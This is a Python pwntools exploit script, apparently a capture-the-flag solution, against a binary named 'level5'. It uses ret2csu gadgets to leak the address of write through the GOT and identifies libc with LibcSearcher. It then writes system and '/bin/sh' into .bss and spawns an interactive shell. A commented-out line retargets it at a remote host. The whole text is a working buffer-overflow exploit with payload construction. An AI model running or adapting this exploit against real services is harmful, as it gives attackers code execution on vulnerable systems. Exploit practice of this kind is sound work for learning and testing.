#!/usr/bin/env python
from pwn import *
from LibcSearcher import *
# context.log_level = 'debug'
context.arch = 'amd64'
p = process('./level5')
# p = remote('127.0.0.1',10001)
elf = ELF('./level5')
write_got = elf.got['write']
read_got = elf.got['read']
main = elf.symbols['main']
bss = elf.bss()
log.success('write_got = ' + hex(write_got))
log.success('read_got = ' + hex(read_got))
log.success('main = ' + hex(main))
log.success('bss = ' + hex(bss))
# gdb.attach(p)

#  4005f0:       4c 89 fa                mov    rdx,r15
#  4005f3:       4c 89 f6                mov    rsi,r14
#  4005f6:       44 89 ef                mov    edi,r13d
#  4005f9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
#  4005fd:       48 83 c3 01             add    rbx,0x1
#  400601:       48 39 eb                cmp    rbx,rbp
#  400604:       75 ea                   jne    4005f0 <__libc_csu_init+0x50>
#  400606:       48 8b 5c 24 08          mov    rbx,QWORD PTR [rsp+0x8]
#  40060b:       48 8b 6c 24 10          mov    rbp,QWORD PTR [rsp+0x10]
#  400610:       4c 8b 64 24 18          mov    r12,QWORD PTR [rsp+0x18]
#  400615:       4c 8b 6c 24 20          mov    r13,QWORD PTR [rsp+0x20]
#  40061a:       4c 8b 74 24 28          mov    r14,QWORD PTR [rsp+0x28]
#  40061f:       4c 8b 7c 24 30          mov    r15,QWORD PTR [rsp+0x30]
#  400624:       48 83 c4 38             add    rsp,0x38
#  400628:       c3                      ret
def csu(rbx, rbp, r12, r13, r14, r15, ret_addr):
	payload = flat(['\x00' * 136, 0x400606, 0, rbx, rbp, r12, r13, r14, r15, 0x4005f0, '\x00' * 56, ret_addr])
	# print repr(payload)
	p.recvuntil('Hello, World\n')
	p.send(payload)
	sleep(1)

# rdi = edi = r13, rsi = r14, rdx = r15
# write(STDOUT_FILENO, write_got, 8)
# r12 = write_got
# rdi = 1, rsi = write_got, rdx = 8
log.info('>>> OUTPUT &write_got <<<')
csu(0, 1, write_got, 1, write_got, 8, main)
write = u64(p.recv(8).ljust(8, '\x00'))
log.success('write = ' + hex(write))
libc = LibcSearcher('write', write)
log.info('>>> SEARCHING FOR LIBC <<<')
libc_base = write - libc.dump('write')
system = libc_base + libc.dump('system')
execve = libc_base + libc.dump('execve')
log.success('libc_base = ' + hex(libc_base))
log.success('system = ' + hex(system))
log.success('execve = ' + hex(execve))

# read(STDIN_FILENO, bss, 16)
# r12 = read_got
# rdi = 0, rsi = bss, rdx = 16
log.info('>>> INPUT execve/system AND str_bin_sh <<<')
csu(0, 1, read_got, 0, bss, 16, main)
payload = flat([system, '/bin/sh\x00'])
p.send(payload)
sleep(1)

# execve("/bin/sh") or system("/bin/sh")
# r12 = execve/system
# rdi = bss + 8 = "/bin/sh"
log.info('>>> EXECUTE execve("/bin/sh") OR system("/bin/sh") <<<')
csu(0, 1, bss, bss + 8, 0, 0, main)
log.info('>>> PWNED BY ASSASSINQ <<<')
p.interactive()
